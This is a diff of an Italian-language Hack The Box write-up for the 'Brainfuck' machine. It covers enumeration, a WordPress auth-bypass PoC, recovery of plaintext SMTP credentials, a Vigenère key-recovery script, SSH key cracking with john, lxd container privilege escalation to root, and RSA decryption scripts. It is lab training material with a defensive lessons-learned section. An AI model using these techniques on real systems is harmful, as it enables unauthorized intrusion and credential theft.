@@ -1,8 +1,11 @@
+# Brainfuck
+
 **TARGET: 10.10.10.17**
 
-# INFORMATION GATHERING
+## INFORMATION GATHERING
 
-Lanciamo un primo scan veloce con [[Nmap]]
+Lanciamo un primo scan veloce con \[\[Nmap]]
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/brainfuck]
 └─# nmap -sC -sV -O -min-rate=5000 10.10.10.17 
@@ -49,9 +52,9 @@ Ricapitolando:
 
 1. La versione di SSH in uso non è associata ad alcuna vulnerabilità critica, quindi è improbabile che la porta 22 sia il nostro punto di ingresso. Avremo bisogno di credenziali per questo servizio.
 2. La porta 443 esegue HTTPS. La pagina dell'indice ci dà il titolo "Welcome to nginx!". Questo è probabilmente un problema di configurazione in cui l'indirizzo IP non sa a quale nome host dovrebbe essere mappato per servire un sito specifico e quindi serve invece la pagina predefinita di ngnix. Per risolvere questo problema, dovremo prima capire l'elenco dei nomi host che si risolvono in questo indirizzo IP e quindi aggiungere questi nomi host al nostro file /etc/hosts. Dalla scansione nmap, otteniamo tre possibili hostname: brainfuck.htb, www.brainfuck.htb e sup3rs3cr3t.brainfuck.htb.
-4. Le porte 25, 143 e 110 eseguono i protocolli di posta. Potremmo aver bisogno di trovare un indirizzo email valido per enumerare ulteriormente questi servizi
+3. Le porte 25, 143 e 110 eseguono i protocolli di posta. Potremmo aver bisogno di trovare un indirizzo email valido per enumerare ulteriormente questi servizi
 
-# ENUMERATION
+## ENUMERATION
 
 Aggiungiamo i hostmane trovati con nmap nel file /etc/hosts
 
@@ -59,15 +62,13 @@ Aggiungiamo i hostmane trovati con nmap nel file /etc/hosts
 10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb.
 ```
 
-Vistiando https://brainfuck.htb ci troviamo di fronte a quello che sembra essere un sito WordPress
-![](../zzz_rev/attachments/Brainfuck2.png)
+Vistiando https://brainfuck.htb ci troviamo di fronte a quello che sembra essere un sito WordPress ![](../zzz\_rev/attachments/Brainfuck2.png)
 
 guardando i dettagli dei certificati ,vediamo che il campo Emittente ci fornisce l'indirizzo e-mail orestis@brainfuck.htb che potrebbe essere utile quando si enumerano le porte del protocollo di posta aperte. Questa e-mail può essere trovata anche sul sito web.
 
-![](../zzz_rev/attachments/Brainfuck1.png)
+![](../zzz\_rev/attachments/Brainfuck1.png)
 
-Come detto prima ci troviamo di fronte a quello che sembra essere un sito WordPress
-Utilizziamo lo strumento [[Wpscn]]
+Come detto prima ci troviamo di fronte a quello che sembra essere un sito WordPress Utilizziamo lo strumento \[\[Wpscn]]
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/brainfuck]                                   
@@ -214,7 +215,7 @@ Secondo la documentazione, questa vulnerabilità consente di aggirare l'autentic
 
 Sia "admin" che "administrator" sono nomi utente validi. Ora che abbiamo un nome utente valido, proviamo a sfruttare la vulnerabilità.
 
-# GAINING AN INITIAL FOOTHOLD 
+## GAINING AN INITIAL FOOTHOLD
 
 Copia il codice POC dalla voce della vulnerabilità su searchsploit e salvalo nel file priv-esc.html. Modificare l'URL con il nome della macchina.
 
@@ -239,7 +240,7 @@ Aggiorniamo la pagina brainfuck.htb e abbiamo effettuato l'accesso come admin
 
 Nella scheda in alto nel percorso Brainfuck Ltd. > Temi Plugin > Impostazioni sul plug-in Easy WP SMTP. Lì troviamo le impostazioni di configurazione SMTP con il nome utente SMTP e la password mascherata SMTP.
 
-Analizzando con l'ispector troviamo la password in chiaro 
+Analizzando con l'ispector troviamo la password in chiaro
 
 La password dell'utente è kHGuERB29DNiNE. Usiamo il client di posta Evolution per accedere alla posta di orestis. Se non hai Evolution installato sul tuo kali, puoi installarlo usando il seguente comando.
 
@@ -247,39 +248,38 @@ La password dell'utente è kHGuERB29DNiNE. Usiamo il client di posta Evolution p
 sudo apt-get install evolution
 ```
 
-Una volta istallato lo apriamo e seguiamo le istruzione della modalità benvenuto 
+Una volta istallato lo apriamo e seguiamo le istruzione della modalità benvenuto
 
-![](../zzz_rev/attachments/1*8cfk_zqsdwrVajKlxbmlQg.webp)
+![](../zzz\_rev/attachments/18cfk\_zqsdwrVajKlxbmlQg.webp)
 
 Inseriamo il nome orestis nel campo Nome completo e orestis@brainfuck.htb nel campo Indirizzo e-mail.
 
-![](../zzz_rev/attachments/1*LWH8GoJ6cC1D_pbc9xuB-g.webp)
+![](../zzz\_rev/attachments/1LWH8GoJ6cC1D\_pbc9xuB-g.webp)
 
 Nella finestra Ricezione email, aggiungiamo brainfuck.htb come Server, 143 come Porta e orestis come Nome utente.
 
 Nella finestra Invio e-mail, aggiungiamo brainfuck.htb come Server, 25 come Porta e Nessuna crittografia come Metodo di crittografia.
 
-![](../zzz_rev/attachments/1*O7O_-dNp-671U28OoVGYoA.webp)
-Ci verra richiesta password di autenticazione. Inseriamo kHGuERB29DNiNE e facciamo clic su OK. Ora possiamo vedere la posta di Orestis!
+![](../zzz\_rev/attachments/1O7O\_-dNp-671U28OoVGYoA.webp) Ci verra richiesta password di autenticazione. Inseriamo kHGuERB29DNiNE e facciamo clic su OK. Ora possiamo vedere la posta di Orestis!
 
-Nella posta troviamo questo messaggio 
+Nella posta troviamo questo messaggio
 
-![](../zzz_rev/attachments/1*q7VcbUijHJjh9z2Wt9VKVA.webp)
+![](../zzz\_rev/attachments/1q7VcbUijHJjh9z2Wt9VKVA.webp)
 
-Nella fase di enumerazione avevamo tre nomi host che abbiamo aggiunto al nostro file hosts. Poiché l'e-mail menziona un forum "segreto", diamo un'occhiata al sito Web sup3rs3cr3t.brainfuck.htb. Sul sito Web, quando facciamo  clic su Accedi, ci viene presentata una pagina di accesso. Inseriamo  le nostre credenziali appena trovate.
+Nella fase di enumerazione avevamo tre nomi host che abbiamo aggiunto al nostro file hosts. Poiché l'e-mail menziona un forum "segreto", diamo un'occhiata al sito Web sup3rs3cr3t.brainfuck.htb. Sul sito Web, quando facciamo clic su Accedi, ci viene presentata una pagina di accesso. Inseriamo le nostre credenziali appena trovate.
 
 Siamo loggati come orestis!
 
-![](../zzz_rev/attachments/1*a4wJVzPvdlsjwy6G5U10eQ.webp)
+![](../zzz\_rev/attachments/1a4wJVzPvdlsjwy6G5U10eQ.webp)
 
 Facciamo clic sul thread di accesso SSH.
 
 Sulla base dei commenti fatti lì, orestis sembra aver perso la sua chiave SSH e vuole che l'amministratore gliela invii su un thread crittografato. Un'altra cosa che notiamo è che Orestis firma sempre il suo messaggio con la frase "Orestis — Hacking for fun and profit".
 
-Nel thered Key, notiamo che i commenti di Orestis sono firmati con lo stesso messaggio che abbiamo visto sopra, tranne che il messaggio è in forma crittografata. Tuttavia, con ogni commento, il testo cifrato generato per la frase è diverso. Pertanto, l'amministratore potrebbe utilizzare il cifrario di Vigenère che è una variazione di un cifrario di sostituzione di Cesare che utilizza una parola chiave e la ripete finché non corrisponde alla lunghezza del testo in chiaro. Quindi la lettera equivalente della parola chiave viene utilizzata per crittografare la corrispondente lettera di testo in chiaro. Pertanto, lo stesso testo in chiaro può generare più testi cifrati diversi.
-Dal momento che abbiamo il testo in chiaro e il corrispondente testo cifrato, possiamo dedurre la chiave poiché questo cifrario è vulnerabile a un noto attacco di testo in chiaro. Questa pagina lo spiega molto bene, quindi non spiegherò come fare.
+Nel thered Key, notiamo che i commenti di Orestis sono firmati con lo stesso messaggio che abbiamo visto sopra, tranne che il messaggio è in forma crittografata. Tuttavia, con ogni commento, il testo cifrato generato per la frase è diverso. Pertanto, l'amministratore potrebbe utilizzare il cifrario di Vigenère che è una variazione di un cifrario di sostituzione di Cesare che utilizza una parola chiave e la ripete finché non corrisponde alla lunghezza del testo in chiaro. Quindi la lettera equivalente della parola chiave viene utilizzata per crittografare la corrispondente lettera di testo in chiaro. Pertanto, lo stesso testo in chiaro può generare più testi cifrati diversi. Dal momento che abbiamo il testo in chiaro e il corrispondente testo cifrato, possiamo dedurre la chiave poiché questo cifrario è vulnerabile a un noto attacco di testo in chiaro. Questa pagina lo spiega molto bene, quindi non spiegherò come fare.
 
 Ho scritto uno script Python per automatizzare il processo di ricerca della chiave.
+
 ```pyhton
 plaintext = "OrestisHackingforfunandprofit"  
 ciphertext = "PieagnmJkoijegnbwzwxmlegrwsnn"  
@@ -290,8 +290,7 @@ key = ""for i in range(len(plaintext)):
  
 ```
 
-Lo script scorre la stringa di testo cifrata e prende ogni carattere in ordine e lo converte nella rappresentazione intera di quel carattere. Quindi sottrae quel valore dalla rappresentazione intera del carattere corrispondente nella stringa di testo in chiaro e applica il modulo di 26 poiché ci sono 26 alfabeti. Questo ti dà un valore compreso tra 0 e 25 inclusi. Tuttavia, poiché la funzione "chr" che trasforma un numero intero nel suo valore di carattere dipende dalla tabella ASCII dove 97 rappresenta "a", 98 rappresenta "b", ecc. Ho dovuto aggiungere 97 al valore intero. Dopo aver passato in rassegna l'intero testo cifrato, stampa la chiave.
-Eseguiamo lo script.
+Lo script scorre la stringa di testo cifrata e prende ogni carattere in ordine e lo converte nella rappresentazione intera di quel carattere. Quindi sottrae quel valore dalla rappresentazione intera del carattere corrispondente nella stringa di testo in chiaro e applica il modulo di 26 poiché ci sono 26 alfabeti. Questo ti dà un valore compreso tra 0 e 25 inclusi. Tuttavia, poiché la funzione "chr" che trasforma un numero intero nel suo valore di carattere dipende dalla tabella ASCII dove 97 rappresenta "a", 98 rappresenta "b", ecc. Ho dovuto aggiungere 97 al valore intero. Dopo aver passato in rassegna l'intero testo cifrato, stampa la chiave. Eseguiamo lo script.
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/brainfuck]
@@ -302,14 +301,14 @@ brainfuckmybrainfuckmybrainfu
 
 Come accennato in precedenza, il cifrario di Vigenère utilizza una parola chiave e la ripete finché non corrisponde alla lunghezza del testo in chiaro. Pertanto, possiamo dedurre che la chiave è. Ora che abbiamo la chiave, possiamo usarla per decifrare la dichiarazione dell'amministratore utilizzando questo strumento [online](https://www.dcode.fr/vigenere-cipher).
 
-Una volta decifrato il testo otteniamo 
+Una volta decifrato il testo otteniamo
 
 ```
 There you go you stupid fuck, I hope you remember your key password because I dont :)  
 https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
 ```
 
-Il testo decifrato ci fa ottenere una chiave id_rsa cifrata che ci prendiamo con curl  e lo salviamo in un file che chiamiamo id_rsa
+Il testo decifrato ci fa ottenere una chiave id\_rsa cifrata che ci prendiamo con curl e lo salviamo in un file che chiamiamo id\_rsa
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/brainfuck]
@@ -347,7 +346,7 @@ EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
 
 ```
 
-Salviamo la chiave in un file che chiameremo id_rsa e useremo ssh2john.py per generare un hash dalla chiave, quindi craccarlo con john:
+Salviamo la chiave in un file che chiameremo id\_rsa e useremo ssh2john.py per generare un hash dalla chiave, quindi craccarlo con john:
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/brainfuck]
@@ -368,7 +367,8 @@ Session completed.
 
 ```
 
-Abbiamo la passphrase  e  possiamo salvarci una copia della id_rsa senza password usando openssl:
+Abbiamo la passphrase e possiamo salvarci una copia della id\_rsa senza password usando openssl:
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/brainfuck]
 └─# openssl rsa -in id_rsa > id_rsa_decrypt
@@ -377,8 +377,8 @@ writing RSA key
 
 ```
 
-
 possiamo collegarci trammite ssh e prenderci la nostra flag user
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/brainfuck]
 └─# ssh -i id_rsa_decrypt orestis@brainfuck.htb 
@@ -400,7 +400,7 @@ orestis@brainfuck:~$ cat user.txt
 
 ```
 
-# PRIVESC
+## PRIVESC
 
 Come possiamo vedere Orestis fa parte del gruppo lxd:
 
@@ -410,9 +410,9 @@ uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip
 
 ```
 
-Essere nel gruppo lxd significa che posso interagire con lxc, il runtime del contenitore Linux. 
+Essere nel gruppo lxd significa che posso interagire con lxc, il runtime del contenitore Linux.
 
-Con `lxc list`  vediamo che non ci sono container in esecuzione:
+Con `lxc list` vediamo che non ci sono container in esecuzione:
 
 ```bash
 orestis@brainfuck:~$ lxc list 
@@ -435,9 +435,9 @@ orestis@brainfuck:~$ lxc image list
 +-------+-------------+--------+-------------+------+------+-------------+
 ```
 
-## EXPLOIT LXC
+### EXPLOIT LXC
 
-Prof of Concept 
+Prof of Concept
 
 L'idea qui è la stessa strategia utilizzata con vari exploit di virtualizzazione. Creerò un nuovo contenitore e monterò l'intero sistema operativo host in quel contenitore da qualche parte. Quindi otterrò una shell su quel contenitore come root e avrò pieno accesso al file system host.
 
@@ -481,8 +481,9 @@ orestis@brainfuck:/dev/shm$ lxc list
 
 ```
 
-#### Shell in Container
-`lxc exec` : mi permetterà di ottenere una shell nel contenitore:
+**Shell in Container**
+
+`lxc exec` : mi permetterà di ottenere una shell nel contenitore:
 
 ```bash
 orestis@brainfuck:/dev/shm$ lxc exec bobVM -- /bin/bash
@@ -491,7 +492,7 @@ uid=0(root) gid=0(root) groups=0(root)
 bash-4.3# 
 ```
 
-## ROOT FLAG SENZA SHELL
+### ROOT FLAG SENZA SHELL
 
 Vediamo i file contenuti all'interno della directory
 
@@ -551,11 +552,9 @@ debug.write(str(e)+'\n')
 
 ```
 
-Sembra che stia eseguendo la crittografia RSA. Innanzitutto, apre il file root.txt e utilizza il suo valore come parametro nella crittografia. La password crittografata è scritta nel file output.txt. Registra anche i parametri nel file debug.txt.
-I parametri p, q ed e sono registrati nel file di debug a cui abbiamo accesso in lettura/scrittura. Poiché abbiamo sia p che q, possiamo calcolare n=p*q, phi=(p-1)(q-1). Abbiamo anche c poiché è scritto nel file output.txt a cui abbiamo accesso in lettura/scrittura. Quindi possiamo calcolare m dall'equazione c = pow(m,e,n).
-Invece di farlo a mano, qualcuno ha già scritto uno [script](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e). Per prima cosa modifica lo script per includere i nostri valori.
+Sembra che stia eseguendo la crittografia RSA. Innanzitutto, apre il file root.txt e utilizza il suo valore come parametro nella crittografia. La password crittografata è scritta nel file output.txt. Registra anche i parametri nel file debug.txt. I parametri p, q ed e sono registrati nel file di debug a cui abbiamo accesso in lettura/scrittura. Poiché abbiamo sia p che q, possiamo calcolare n=p\*q, phi=(p-1)(q-1). Abbiamo anche c poiché è scritto nel file output.txt a cui abbiamo accesso in lettura/scrittura. Quindi possiamo calcolare m dall'equazione c = pow(m,e,n). Invece di farlo a mano, qualcuno ha già scritto uno [script](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e). Per prima cosa modifica lo script per includere i nostri valori.
 
-### Scritp 1 
+#### Scritp 1
 
 ```bahs
 def egcd(a, b):
@@ -616,7 +615,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 ```
 
-### Script 2 con decodifica ascii completa
+#### Script 2 con decodifica ascii completa
 
 ```bash
 #!/usr/bin/python
@@ -652,19 +651,14 @@ print out.decode("hex")
 
 ```
 
-
-# LESSON LEARNED
+## LESSON LEARNED
 
 Per ottenere un punto d'appoggio iniziale sulla macchina abbiamo sfruttato cinque vulnerabilità.
 
 1. Una vulnerabilità nota nella versione di WordPress utilizzata per ospitare il sito web. Questo avrebbe potuto essere facilmente evitato se fosse stata installata la versione con patch.
-
 2. Una password salvata nelle impostazioni di configurazione SMTP. Sebbene la password sia mascherata, la password in chiaro può essere facilmente visualizzata nel codice sorgente. Se le impostazioni di configurazione non richiedono il salvataggio della password sul sito Web, l'utente deve cancellare la password e inserirla ogni volta che utilizza il servizio.
-
 3. Una password memorizzata in chiaro nell'e-mail. Anche in questo caso, se è necessario che la password venga trasmessa via e-mail, all'utente dovrebbe essere stato richiesto di cambiare la password al primo accesso.
-
 4. I forum hanno utilizzato il Vigenère Cipher che è noto per essere vulnerabile a un noto attacco di testo in chiaro. Dato che avevamo sia il testo cifrato che il corrispondente testo in chiaro, siamo riusciti a capire la chiave di cifratura.
-
 5. È stata utilizzata una password debole per crittografare la chiave privata RSA. Poiché la password era davvero debole, JtR impiegò solo un paio di secondi per decifrarla. L'utente dovrebbe aver utilizzato una password sufficientemente lunga e difficile da decifrare. Allo stesso modo, l'utente avrebbe dovuto utilizzare un gestore di password per archiviare la chiave privata RSA invece di dover chiedere all'amministratore di pubblicarla sul sito web.
 
 Per aumentare i privilegi ho sfruttato una vulnerabilità.
